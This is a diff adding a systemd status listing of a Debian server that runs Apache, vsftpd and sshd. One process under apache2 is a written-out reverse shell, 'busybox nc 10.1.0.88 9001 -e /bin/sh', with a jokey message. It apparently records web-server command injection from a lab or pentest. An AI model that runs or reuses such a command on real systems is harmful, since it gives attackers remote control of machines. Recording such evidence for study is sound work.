@@ -1,0 +1,59 @@
+* ahmed
+    State: running
+    Units: 240 loaded (incl. loaded aliases)
+     Jobs: 0 queued
+   Failed: 0 units
+    Since: Wed 2024-05-22 11:53:51 CEST; 52min ago
+  systemd: 252.22-1~deb12u1
+   CGroup: /
+           |-init.scope
+           | `-1 /sbin/init
+           |-system.slice
+           | |-apache-htcacheclean.service
+           | | `-9380 /usr/bin/htcacheclean -d 120 -p /var/cache/apache2/mod_cache_disk -l 300M -n
+           | |-apache2.service
+           | | |- 9675 /usr/sbin/apache2 -k start
+           | | |- 9676 /usr/sbin/apache2 -k start
+           | | |- 9677 /usr/sbin/apache2 -k start
+           | | |- 9678 /usr/sbin/apache2 -k start
+           | | |- 9679 /usr/sbin/apache2 -k start
+           | | |- 9680 /usr/sbin/apache2 -k start
+           | | |-10575 /usr/sbin/apache2 -k start
+           | | |-10580 /usr/sbin/apache2 -k start
+           | | |-10705 sh -c "echo Hello  you cuddly cat! I started a revshell to 10.1.0.88:9001;busybox nc 10.1.0.88 9001 -e \"/bin/sh\""
+           | | |-10706 /bin/sh
+           | | `-10707 systemctl --no-pager --full status
+           | |-cron.service
+           | | `-349 /usr/sbin/cron -f
+           | |-dbus.service
+           | | `-353 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+           | |-herosshd.service
+           | | `-9957 "sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"
+           | |-ifup@ens18.service
+           | | `-10535 dhclient -4 -v -i -pf /run/dhclient.ens18.pid -lf /var/lib/dhcp/dhclient.ens18.leases -I -df /var/lib/dhcp/dhclient6.ens18.leases ens18
+           | |-mgmtsshd.service
+           | | `-386 "sshd: /usr/sbin/sshd -D -f /etc/ssh/mgmtsshd_config [listener] 0 of 10-100 startups"
+           | |-qemu-guest-agent.service
+           | | `-356 /usr/sbin/qemu-ga
+           | |-system-getty.slice
+           | | `-getty@tty1.service
+           | |   `-383 /sbin/agetty -o "-p -- \\u" --noclear - linux
+           | |-systemd-journald.service
+           | | `-201 /lib/systemd/systemd-journald
+           | |-systemd-logind.service
+           | | `-358 /lib/systemd/systemd-logind
+           | |-systemd-timesyncd.service
+           | | `-260 /lib/systemd/systemd-timesyncd
+           | |-systemd-udevd.service
+           | | `-udev
+           | |   `-227 /lib/systemd/systemd-udevd
+           | `-vsftpd.service
+           |   `-9896 /usr/sbin/vsftpd /etc/vsftpd.conf
+           `-user.slice
+             `-user-0.slice
+               |-session-9.scope
+               | `-10388 "sshd: root@notty"
+               `-user@0.service
+                 `-init.scope
+                   |-1860 /lib/systemd/systemd --user
+                   `-1862 "(sd-pam)"
